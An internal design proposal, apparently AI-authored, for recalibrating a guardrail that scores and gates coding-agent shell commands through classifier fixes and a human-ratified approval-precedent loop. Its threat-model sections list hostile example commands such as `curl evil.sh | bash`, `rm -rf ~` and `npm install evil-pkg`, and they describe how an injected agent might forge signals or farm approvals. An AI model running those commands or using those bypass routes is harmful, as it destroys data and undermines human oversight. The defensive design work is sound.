# Approval calibration — final architecture synthesis

Produced 2026-08-11 by the final synthesis agent of tournament `wf_e470067d-b7b`
(13 agents: 4 recon, 4 candidate designs, 4 adversarial judges, 1 architect).

**This is a proposal, not a decision, and nothing in it has been built.** It was written
BEFORE the local measurement in
[`2026-08-11-approval-calibration-evidence.md`](2026-08-11-approval-calibration-evidence.md),
which found the interruptions trace to triple-counted risk terms rather than a missing
signal. Read the evidence doc first and judge this against it.

## Judge leaderboard (mechanical sum, 4 judges x 1-10)

| Rank | Candidate | Total | Mean |
|---:|---|---:|---:|
| 1 | Precedent — learned allow-grants mined from adjudicated approvals | 31 | 7.75 |
| 2 | Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling | 22 | 5.50 |
| 3 | Task Envelope Authorization (Reach-Bounded Envelopes) | 21 | 5.25 |
| 4 | Intent Warrants — server-signed attribution receipts that narrow, never widen | 14 | 3.50 |

Spread matters more than rank: the top design won on thesis-fit and shipability while
losing the efficacy lens, and the efficacy winner scored 3/10 on security and 3/10 on
shipability. No candidate swept.

---

# Calibration decision: fix the label, keep the evidence, learn only from adjudicated approvals

## The verdict

First we fix the scoring bug that makes deleting a cache folder **inside** `node_modules` score 100 while deleting **all of** `node_modules` scores 35 — a five-line widening applied to both copies of the classifier (server and hook) in one commit, pinned by golden vectors; this alone converts the complained-about blocks into silent allows. Second, the server starts **keeping** the evidence tags it already computes for every command (`regenerable_artifact`, `destructive`, `remote_exec`, …) instead of throwing them away, so every decision records exactly what kind of act was graded. Third, when Wes approves the same narrowly-tagged safe shape five times across two different days, the `/policies` page offers him **one button** that stops asking about that exact shape for 14 days — one denial cancels it forever, and blocked actions and dangerous shapes are structurally unlearnable.

Grafted from the losers: Floor & Ceiling's rule that a classifier fix must land in **both** mirrors (`evidence.ts` + `bash_classifier.py`) in one commit with paired vectors, because the `max()` fold makes the worse label final; and Task Envelope's fail-closed reach principle, satisfied here not by a third regex classifier but by admitting only shapes whose **flag itself proves workspace-boundedness**. I rejected all three presence/attendance mechanisms (Intent Warrants, attendance leases, task envelopes) for one shared reason: each one's mint rides the governed agent's own credential, so the "out-of-band" signal is forgeable with one HTTP call — and I rejected the `--force-with-lease` split on arithmetic (see misses).

## Why the current system is miscalibrated

The gating variable behind the complaint is not the threshold and not the policy set — it is the **label**, and the label has a monotonicity bug in both classifiers. `isRegenerableArtifactTarget` (app/lib/guard/evidence.ts:107-112) and `_is_regenerable_dir_name` (hooks/dashclaw_agent_intel/bash_classifier.py:310-314) both test targets by **bare-name set membership**, so `rm -rf ./dist ./node_modules/.cache` fails the allowlist (`node_modules/.cache` is not a bare name), `.every()` fails (evidence.ts:281), and the command grades bare `destructive`: security base 80 + irreversible 15 + goal-pattern 20 = clamped **100** — identical to `rm -rf ~`. The client classifier misfires the same way, and trust rule D1's `max()` fold (app/lib/guard/risk.ts:87-94) guarantees the **worse** of the two labels is final, so fixing only one side fixes nothing. At 100, the default pack's only risk rule is a hard block (app/lib/guardrails/packs/catastrophe-only — `threshold: 100, action: block`; same rule in claude-code mode at app/lib/policy-modes/compile.ts:113), which is unappealable by constitution. And every correction channel is structurally unable to reach a mislabeled score: `allow_grant` must be hand-authored before the shape ever occurs, the operator grant covers only a byte-identical retry within 15 minutes (evaluate.ts:341-344), loosening needs ≥10 fired interrupts at a 95% override rate (app/lib/posture/loosening.ts:19-27), and the v4.74 calibration controller is tighten-only by its own charter. **Genuinely broken:** the subtree-scores-higher-than-whole label bug, live in both mirrors. **Looks broken but is not:** the 100→block rail (working as designed), the categorical `require_approval` envelopes (claude-code-starter keys on `action_types: [api]` and `[build]` at packs/claude-code-starter/policies.yml:42-47 and :66-71 — deliberate), and the literal phrase "approving commands at risk 100" — under Wes's pack a 100 is a *block*, not an approval; his golden-vector history records maintainer **blocks** at 100 on benign commands, which is the same defect wearing a different verdict.

## The new decision function

**Part A — slice 1, the label fix (both mirrors, one commit).**

```ts
// app/lib/guard/evidence.ts:107 — WIDENED. A proper relative subtree of a
// regenerable root is regenerable: if deleting all of `node_modules` is
// routine (it is allowlisted), deleting `node_modules/.cache` cannot be worse.
// The name list itself (evidence.ts:57-60) does NOT grow — the 2026-08-05 F5
// conservatism (no `build`/`out`/`target`) stands.
function isRegenerableArtifactTarget(target: string): boolean {
  if (/[*?[]/.test(target)) return false;                       // globs: unchanged
  let t = target.replace(/\\/g, '/').replace(/\/+$/, '');
  if (t.startsWith('./')) t = t.slice(2);
  if (!t || t.startsWith('/') || t.startsWith('~') || /^[a-z]:/i.test(t)) return false; // absolute/home: never
  const parts = t.toLowerCase().split('/');
  if (parts.includes('..')) return false;                       // traversal: never (load-bearing —
                                                                //   `node_modules/../src` must fail)
  if (REGENERABLE_ARTIFACT_DIRS.has(parts[0]) === false) return false;
  return parts.length === 1 || true;                            // bare name OR subtree of a listed root
}
```

The identical widening lands in `_is_regenerable_dir_name` (bash_classifier.py:310-314), consumed by `is_regenerable_artifact_rm` (:317-331, which already rejects globs) and by the pretool `cleanup` remap (hooks/dashclaw_pretool.py:476-478). Client result for the S1 command: cap at `_REGENERABLE_RM_BASE = 35` (bash_classifier.py:303) instead of 100.

**Part B — slice 2, keep the coordinate the server already computes.**

```ts
// app/lib/guard/risk.ts:102-108 — EvidenceDerivedBreakdown gains one field:
//   flags: string[];   // sibling term only; NEVER enters any hashed vector
//                      // (score-provenance invariant, risk.ts:96-101)

// app/lib/guard/evaluate.ts:841 foldEvidenceIntoContext — two added lines:
  context.evidence_flags = evidence.flags;      // SERVER-SET-ONLY (see trust argument)
  return { derived_action_type: evidence.base_risk /*…existing…*/, flags: evidence.flags, … };
// Flags then persist automatically inside guard_decisions.context._risk_breakdown
// via the additive-jsonb pattern the code itself endorses (evaluate.ts:740-746).
// ZERO migrations. app/lib/validate.js is DELIBERATELY UNCHANGED:
// `evidence_flags` stays absent from GUARD_INPUT_SCHEMA (validate.js:292-344),
// so validate() strips any client-sent copy before evaluateGuard runs.
```

**Part C — slice 3, the precedent predicate and the loop.**

```ts
// app/lib/policy-shapes.ts — NEW, the safety core. A CLOSED allowlist:
// every shape not enumerated is unlearnable forever, at any approval count.
// ADMISSION RULE (recorded, ratchet-disciplined like the surface budget):
// a shape is listed only if its worst case over ALL inputs the classifier
// grades into it is recoverable by re-running a build command, AND its flag
// set itself proves workspace-boundedness.
export const PRECEDENT_ELIGIBLE = new Set([
  'cleanup|destructive,regenerable_artifact',
  // `regenerable_artifact` only sets when EVERY delete target passes
  // isRegenerableArtifactTarget (evidence.ts:281), which rejects globs,
  // absolute paths, `~`, and `..` — so this shape is workspace-bounded BY
  // CONSTRUCTION. No reach classifier needed.
]);
// NOT listed, deliberately and permanently without a recorded decision:
//   'build|package'  — npm/pip install of ANY package lands here (evidence.ts:300-301);
//                      a ratified precedent would allow `npm install evil-pkg`
//                      (postinstall = RCE) with zero clicks. Security judge's
//                      fatal flaw; the pressure to add it will be constant. NO.
//   'other|'         — the unclassified default bucket (evidence.ts:259-260);
//                      listing it grants everything the parser cannot read.
//   anything with:   protected_target, device_write, interpreter_destructive,
//                    remote_exec, secret_exposure, sensitive_path, privilege,
//                    deploy, vcs_dangerous  (redundant NEVER_PRECEDENTED gate).

export function precedentKey(actionType: string, flags: string[]): string {
  return `${actionType}|${[...flags].sort().join(',')}`;
}
export function precedentEligible(actionType: string, flags: string[]): boolean {
  if (flags.some((f) => NEVER_PRECEDENTED.has(f))) return false;
  return PRECEDENT_ELIGIBLE.has(precedentKey(actionType, flags));
}

// grantMatches (policy-shapes.ts:123-144) — EXTENDED. Field absent ⇒
// byte-identical to today. Field present ⇒ strictly TIGHTENS the match.
export function grantMatches(rules: GrantRules, context: GrantContext): boolean {
  if (context.declared_action_type && context.declared_action_type !== context.action_type)
    return false;                                            // :132-138 unchanged (reclass firewall)
  if (typeof rules.action_type !== 'string' || rules.action_type !== context.action_type)
    return false;                                            // :139-141 unchanged
  if (Array.isArray(rules.precedent_flags)) {                // NEW
    const ctx = context.evidence_flags;
    if (!Array.isArray(ctx)) return false;                   // no act ⇒ no flags ⇒ NO coverage
    const want = rules.precedent_flags as string[];
    if (ctx.length !== want.length) return false;            // EXACT SET EQUALITY, never subset:
    const have = new Set(ctx as string[]);                   //   {destructive,regenerable_artifact}
    if (!want.every((f) => have.has(f))) return false;       //   must not cover {destructive,…,privilege}
    if (!precedentEligible(String(rules.action_type), want)) // re-checked AT MATCH TIME: an allowlist
      return false;                                          //   tightening retroactively disarms grants
  }
  if (rules.target_prefix == null) return true;              // :142-143 unchanged
  return targetPrefixMatches(String(rules.target_prefix), context);
}
```

**Where each verdict comes out, and composition with the lattice** (all line refs verified this session):

```text
INPUTS
  act                    hook: _build_act, dashclaw_pretool.py ~1600-1660 (the bytes that execute)
  evidence flags         SERVER: classifyAct (evidence.ts:481) inside foldEvidenceIntoContext (evaluate.ts:841-885)
  risk terms             SERVER: serverRiskTerms (risk.ts:63-71); client risk_score via validate.js:295
  precedent grant row    HUMAN: ratified via POST /api/policies/loosening (existing admin route)
  deny/approve labels    HUMAN: approvals route stamps approved_by / [HITL Decision: DENY]

PIPELINE (evaluate.ts) — nothing above the grant pass changes:
  :841  foldEvidenceIntoContext        — mismatch swap unchanged; NOW also keeps flags
  :988  computeRiskAssessment          — D1 max() fold (risk.ts:87-94) UNTOUCHED; precedent never changes a number
  :1021 runLocalPolicies               — raise-only  → warn / require_approval / BLOCK come out here
  :1022 scanPromptInjection            — raise-only
  :1029 containment_promote raise      — raise-only
  :1040 runWebhookPolicies             — raise-only
  :1044 runCalibrationController       — tighten-only (unchanged)
  :1051 applyAllowGrants               — ★ PRECEDENT ACTS HERE AND ONLY HERE ★
        :306 containment_promote        → return (precedent can never cover a merge)
        :307 decision not warn/req_appr → return (BLOCK IS UNREACHABLE — absolute)
        :312 ungrantable gating policy  → return (catastrophe/control-plane rules survive)
        :330 grantIsExpired (14d TTL)   → skip stale grant
        :331 grantMatches (extended)    → :334 highestDecision = 'allow'   ← the ONLY new allow exit
  :1060 applyOperatorApprovalGrant     — unchanged
  :1074 applyPlanStepGrant             — unchanged (operator DENY still raises to block after)
  :1187 applyBlockOverride ×2          — unchanged (replay/act-binding still block a precedent-allowed act)
```

**Missing or stale input ⇒ fail closed, every path:**

| Input state | Behavior |
|---|---|
| No `act` attached | `classifyAct` → null → `evidence_flags` undefined → precedent branch returns false; decision stands |
| Client POSTs `evidence_flags` | Stripped by the GUARD_INPUT_SCHEMA whitelist before evaluation (validate.js:292-344); regression test pins this |
| Flag set differs from ratified set (any direction) | Exact equality fails; decision stands |
| Shape removed from allowlist after ratify | Match-time `precedentEligible` re-check fails; grant goes inert, surfaced via app/lib/inert-policies.ts |
| Grant older than 14 days | `grantIsExpired` (evaluate.ts:330 / policy-shapes.ts:89-92) skips it |
| Declared/derived action_type mismatch | Reclassification firewall (policy-shapes.ts:132-138) fails the grant closed |
| Any deny or block on the shape in the mining window | Loop gates (`maxDenials: 0`) emit no proposal; an existing precedent is revoked by the ratify route on the next deny |
| Corrupt grant rules JSON | evaluate.ts:320-327 skips and reports unenforceable |

**The mining rule** (new rule in the existing loosening engine, app/lib/posture/loosening.ts, fed by a sibling of `getInterruptOutcomesByPolicyAction`, app/lib/repositories/loosening.repository.ts:61-104, keeping its `::timestamptz` cast and synthetic exclusion): group `require_approval` decisions by `(action_type, sorted evidence flags)` from the persisted `_risk_breakdown`; propose only when `approved ≥ 5`, `denied = 0`, `blocked = 0`, `distinct_days ≥ 2`, shape on the allowlist. Ratify (admin-gated, non-null principal, same pattern as the route's existing POST) inserts an ordinary `allow_grant` row with `precedent_flags`, `expires_at` = now+14d, `max_uses: 50` (swept at read time; the TTL, not the counter, is the hard bound). The server rebuilds the grant from its **own** mined evidence, never from the client body — the rule this engine already states (loosening.ts:84-85).

## The trust argument

**Rule D1 is not bent — it is not touched.** D1 governs the risk fold: client signals may only raise, because the server score derives from client-declared descriptors (risk.ts:81-94). This design edits no line of `computeEffectiveRisk` or `computeRiskAssessment` and adds no term to the `max()`. The downgrade happens at the decision layer, inside `applyAllowGrants` — a pass that already exists, already excludes `block` (evaluate.ts:307), already honors `ungrantable` (:312-316), and already fails closed on reclassification (policy-shapes.ts:132-138).

**The signal that lowers is not client-authored, and that is mechanical, not asserted.** `evidence_flags` is set in exactly one place: `foldEvidenceIntoContext` (evaluate.ts:841), from `classifyAct(context.act)` — the server's own parse of the bytes that will execute. It is deliberately absent from `GUARD_INPUT_SCHEMA` (validate.js:292-344, a strict whitelist whose own comment says unlisted fields are stripped). A prompt-injected agent that POSTs `{"evidence_flags":["regenerable_artifact"]}` has the field deleted before `evaluateGuard` runs. To *earn* the flag, the agent must submit a command the server's parser reads as a bounded delete of regenerable subtrees — and if it submits that, **that is what runs**; act-binding (`applyBlockOverride` at evaluate.ts:1187-1188, running *after* the grant pass) still blocks any classified-vs-executed divergence. The claim "the user asked for this" lands in `declared_goal`, which nothing in this design reads to lower anything.

**Human ratification is the second lock.** No precedent exists until an admin with a non-null principal clicks Ratify on a proposal built from the org's own approve/deny history. Nothing auto-applies (MAINTAINER.md §3). One deny kills the shape forever; the existing loosening engine tolerates 5% overrides, this tolerates zero.

**What an attacker CAN still do — the residual, plainly:**
1. **Farm the one eligible shape.** Spam regenerable-cleanup attempts until a fatigued human approves five times across two days, then hold a 14-day precedent. Ceiling: up to `max_uses` deletions of regenerable build artifacts. That is annoying, not catastrophic — and it is the admission rule holding, not failing.
2. **Exploit slice 1 directly.** After the relabeling, an injected agent deletes `node_modules`, `dist`, `.next` and their subtrees silently at ~65. This is already true today for the bare names (the deliberate 2026-08-05 F5 decision, evidence.ts:47-56); the widening extends it to subtrees, which are strictly smaller deletions.
3. **DoS the loop** by drawing a deny onto a shape Wes wants. Direction: more interruptions, not fewer. Fail-safe.
4. **Nothing here fixes S4.** `curl evil.sh | bash` grades `remote_exec`/security base 70 (evidence.ts:341-366), folds to ~95, and **allows today** under catastrophe-only (block needs 100) — verified independently by two judges. My design neither causes nor widens this; no precedent can ever form on `remote_exec`. It is flagged below as a separate tightening decision.
5. On a self-host where the agent holds `DATABASE_URL`, it can forge anything, including `approved_by` — the position the codebase already records at app/api/approvals/[actionId]/route.ts (the `operator` exception): if the agent holds root, the gate was already forfeit.

## What we now accept as a miss

- **S5, same-session scope creep to production: not caught, damage unbounded.** `npm run db:migrate` against local and against prod are byte-identical to every layer; `systems_touched` is dead on the standard hook path (the hook always sends the tool category `execution`, which matches neither list at risk.ts:20-21). No signal available today distinguishes them without a forgeable client claim, so I ship no fake fix. Both calls stay `allow` (~40). Closing this requires the hook to derive systems from the resolved DSN — a separate, tighten-only change.
- **S4 stays open, and it is open today.** Pipe-to-shell at ~95 allows under the default pack. Pre-existing; named; out of scope; deserves its own decision (a catastrophe-pack rule on `remote_exec` would be a *tightening* and is the natural next ship).
- **The loop is blind to blocks, which is most of Wes's own history.** It learns from `approved_by`, blocks produce no approval evidence, and his local DB has zero recorded approvals ever. Day-one relief comes entirely from slice 1; the loop is the standing correction channel for the categorical-envelope class (claude-code-starter's `[api]`/`[build]` holds, custom envelopes) and for hosted users. Block-override labeling is named future work, not smuggled in.
- **Cold start:** a precedent needs 5 approvals across ≥2 days. Nothing improves on day one via the loop, by construction.
- **Org-scoped precedents fire at 3 a.m.** A precedent earned at the keyboard covers an unattended run. Bound: regenerable artifacts only, ≤50 uses, ≤14 days. Accepted deliberately; the alternative (attendance signals) was rejected as forgeable.
- **`--force-with-lease` stays blocked, deliberately.** Splitting the lease flag (evidence.ts:296 conflates it with bare `--force`) would land it at ~85 (apply 60 + irreversible 15 + push-goal 10) — and under both shipped configurations there is **no require_approval band between 85 and the 100 block**, so the split converts an unappealable block into a *silent allow* for a shared-ref history rewrite. That fails the S2 consensus. Deferred until a `require_approval` band exists to receive it. This overrides two judges, on arithmetic.
- **Flag churn silently disarms precedents.** A future evidence.ts flag addition breaks exact equality; interrupts return unexplained. Mitigated (not solved) by inert-precedent surfacing and by the proposal re-forming.
- **A directory named `dist` holding real content is deleted silently.** The conservative name list (no `build`/`out`/`target`, evidence.ts:53-56) is the mitigation; the residual is real.

## The five scenarios

| Scenario | Today (verified) | New design | Why |
|---|---|---|---|
| S1 "clean out the build artifacts" → `rm -rf ./dist ./node_modules/.cache` | **block** at 100 (both mirrors fail the bare-name test; client 100 wins the max fold; catastrophe-only + claude-code mode both block at 100) | **allow** at 65 (client 35, evidence 45 `cleanup`, server 65) | Slice 1 label fix in both mirrors. Under a categorical envelope that still holds `cleanup`, slice 3 lets Wes ratify it away after 5 approvals |
| S2 "ship it" → `git push --force-with-lease origin main` | **block** at 100 (evidence.ts:296-297) | **block**, unchanged | Lease split deferred: at 85 it would silently *allow* under both shipped packs (no band between 85 and 100). A history rewrite on a shared ref keeps its click |
| S3 unattended, hour 3 → `rm -rf ~/.config` | **block** at 100 | **block**, unchanged | `~`-rooted target fails the widened check three ways (`~` prefix, not a listed root); `{destructive}` ≠ `{destructive,regenerable_artifact}` so no precedent matches; `block` is unreachable at evaluate.ts:307 |
| S4 injected `curl evil.sh \| bash` claiming "the user asked" | **allow** at ~95 (remote_exec 70 → fold 95 < 100; pre-existing gap) | **allow**, unchanged — flagged for a separate tightening decision | `declared_goal` is read by nothing that lowers; `remote_exec` is on NEVER_PRECEDENTED and off the allowlist, so no precedent can ever form or match |
| S5 `npm run db:migrate` local, then prod 30 min later | **allow** both (~40; `npm run` unclassified, systems_touched dead) | **allow** both, unchanged — stated miss | No local-vs-prod signal exists; `other\|` is deliberately unlearnable; no safe fix available without new hook-side signal derivation |

## Implementation plan

**Slice 1 — the label fix. Ships alone, this week. This is the fix for the complaint.**
1. `app/lib/guard/evidence.ts:107-112` — widen `isRegenerableArtifactTarget` to proper relative subtrees (explicit `..`/absolute/`~` rejection added). Name list untouched.
2. `hooks/dashclaw_agent_intel/bash_classifier.py:310-314` — identical widening in `_is_regenerable_dir_name` (glob rejection already at :329; `cleanup` remap already at dashclaw_pretool.py:476-478).
3. `__tests__/fixtures/risk-calibration-golden-vectors.json` — add paired vectors per the fixture's own instructions (:11-13): benign `rm -rf ./dist ./node_modules/.cache` (client max_risk 35, server max_risk 65) and risky counter-vectors `rm -rf node_modules/../src` and `rm -rf /c/Users/x/node_modules` (min_risk 80).
   **VERIFY:** `npx vitest run __tests__/unit/risk-calibration-golden.test.js` AND the Python runner `hooks/tests/test_risk_calibration_golden.py` (the two-sided contract named in the fixture) — then full gates.
4. Redistribution: installed hooks are copies — `dashclaw install-hooks --global` + session restart; plugin mirrors regenerate via the pre-commit `bundles:refresh`. No `cli/**` change → **no entry-path drill triggered**.
   **Gates:** `npm run lint`, `npx vitest run` (full), `npm run typecheck` (.ts touched), `npx next build` (app/** touched), `npm run surface:check`, `scripts/check-doc-counts.mjs --strict`.

**Slice 2 — persist the coordinate.**
5. `app/lib/guard/risk.ts:102-108` — `flags: string[]` on `EvidenceDerivedBreakdown`. `app/lib/guard/evaluate.ts:841-885` — set `context.evidence_flags`, return flags (rides `_risk_breakdown` jsonb at :740-746; zero migration). `app/lib/guard/types.ts` — `evidence_flags?: string[]` documented SERVER-SET-ONLY. `app/lib/validate.js` — **no change**, plus a hostile-input test asserting `validate()` strips a client-sent `evidence_flags`.
   **VERIFY:** new unit test + `npm run typecheck` + full vitest + build.

**Slice 3 — the precedent loop.**
6. `app/lib/policy-shapes.ts` — `PRECEDENT_ELIGIBLE` (one entry), `NEVER_PRECEDENTED`, `precedentKey`, `precedentEligible`, `grantMatches` extension. Unit tests: S1/S3 flag-set pair, superset rejection, absent-field no-op, match-time eligibility re-check.
7. `app/lib/posture/loosening.ts` — `PRECEDENT_RULE` + defaults + `derivePrecedentProposals`; `app/lib/repositories/loosening.repository.ts` — `getPrecedentOutcomes` (sibling of :61-104, jsonb flag extraction, same `::timestamptz` and synthetic exclusion) + `createPrecedentGrant`; `app/api/policies/loosening/route.ts` — GET merges precedent proposals, POST ratify branch inserts the grant behind `getOrgRole === 'admin'` + non-null `getUserId` (route already imports all three, :5); deny-revocation on the shape. `app/policies/components/TriageInbox.tsx` — card copy in the existing loosen queue (Ratify/Dismiss/Undo already wired via `looseningClient`). `app/lib/inert-policies.ts` — surface never-matched precedents.
   **VERIFY:** unit tests for gates (5/0/2-day), route tests, full gates, and **rendered proof** via the frontend-verify skill (below).
8. Docs in the same change: `docs/architecture/trust-and-failure-model.md` (D1 addendum: why a decision downgrade keyed on a whitelist-stripped server field does not invert the boundary), `docs/DECISIONS.md` + `docs/maintainer-log.md` + `CHANGELOG.md`, HUMAN-EXPERIENCE four answers. No counts change.

## Human surface

**Slice 1 is visible immediately on existing pages:** the `/decisions` detail breakdown (`app/components/RiskBreakdownPanel.tsx`) shows `cleanup / 45 / regenerable_artifact` where it showed `security / 100`, and the PostureHero friction line on `/policies` ("This policy set interrupted your agents **N** times in the last 7 days", `app/policies/components/PostureHero.tsx:146-158`) is the before/after meter.

**Slice 3, click path, zero terminal:** left nav → **Policies** → the **"Needs your call"** inbox (TriageInbox, already the five-queue triage surface). The card:

> **Stop asking about: deleting regenerable build artifacts**
> You approved this 5 times across 3 days. Never denied.
> Covers recursive deletes of build output only (`dist`, `.next`, `node_modules`, caches — and folders inside them). Never `~`, never secrets, never force pushes, never installs.
> Expires in 14 days. One denial cancels it permanently. *Examples:* [links to /decisions]
> **[ Ratify ] [ Dismiss ]** (Undo available after either)

Ratified precedents appear in the `/policies` Ledger as normal policy rows with expiry badges and the standard deactivate toggle; every covered action on `/decisions` shows "covered by precedent (approved 5×, expires in Nd)" in its causal chain; a precedent that has matched zero times surfaces through the inert-policies path instead of failing silently. Before calling it done: drive `/policies` and `/decisions` with the frontend-verify skill and confirm the card renders from real mined evidence, Ratify creates the grant, and the next matching guard call returns `allow` naming it.

## Cost and risk

- **Surface budget: 0 of every ceiling**, all verified at 100% today (contracts/surface-budget.json: apiRoutes 131, appPages 53, mcpTools 17, mcpResources 3, sdkNode 39, sdkPython 59, cliCommands 14, guardPolicyTypes 16). No new route, page, policy type, SDK method, MCP tool, or CLI command. No THESIS.md amendment.
- **Migrations: 0.** Flags ride `guard_decisions.context._risk_breakdown` (the endorsed additive-jsonb pattern, evaluate.ts:740-746); `precedent_flags`/`max_uses` ride `guard_policies.rules` JSON.
- **Hooks:** one edited existing file (`bash_classifier.py`), no new hook events, no settings.json change. Redistribution = reinstall + restart; a stale client fails **safe** (it keeps over-scoring, the server side under-scores, `max()` keeps today's behavior until reinstall — visible, not dangerous).
- **Runtime parity: full.** Claude Code and Codex invoke the same `dashclaw_pretool.py`/`bash_classifier.py` (Codex wiring per cli/lib/codex/install.js); Hermes and Claude Desktop's cooperative MCP path are covered by the server-side evidence fix, which grades the act regardless of client. Slice 3 is server+UI only.
- **Guard hot path: zero new reads.** `classifyAct` already runs; the grant loop already iterates loaded policies; mining runs on `/policies` page load only. **app/api/guard/route.ts (worst-health file, 1.0/10) is not touched by any slice.**
- **Regression risk:** slice 1 moves persisted scores for exactly one command class, pinned by paired two-sided golden vectors; the `grantMatches` extension is a structural no-op when the field is absent, so all existing grant behavior is byte-identical.

## What would prove this wrong

- **Falsifier 1 (slice 1 missed the real path):** within 14 days of slice 1 shipping, Wes hits one more block or approval at risk ≥ 90 on a command whose delete targets are all regenerable roots or their subtrees. Check: the new golden vectors vs his live `/decisions` rows. If it fires, the pain lives in a branch we did not measure — reopen recon on his live decision stream, not the corpus.
- **Falsifier 2 (the invariant broke):** any decision whose `matched_policies` names a precedent grant carries evidence flags other than the ratified set, or an act target outside the regenerable class (auditable from persisted `_risk_breakdown`). One occurrence = pull the loop the same day and treat the allowlist admission rule as failed.
- **Falsifier 3 (wrong fuel):** 60 days after slice 3, zero precedent proposals have been ratified across all orgs while categorical `require_approval` interrupts still fire ≥ 10/week somewhere. Then approval evidence is the wrong training signal, and the block-override labeling follow-on gets built instead of iterating on this loop.
- **Falsifier 4 (the thesis one):** the PostureHero 7-day interruption count for Wes's org does not drop by at least half within 30 days of slice 1, or he disables any enforcement in that window. Then the miscalibration was never the S1 label class, and this decision document is evidence for the next recon, not a foundation to extend.
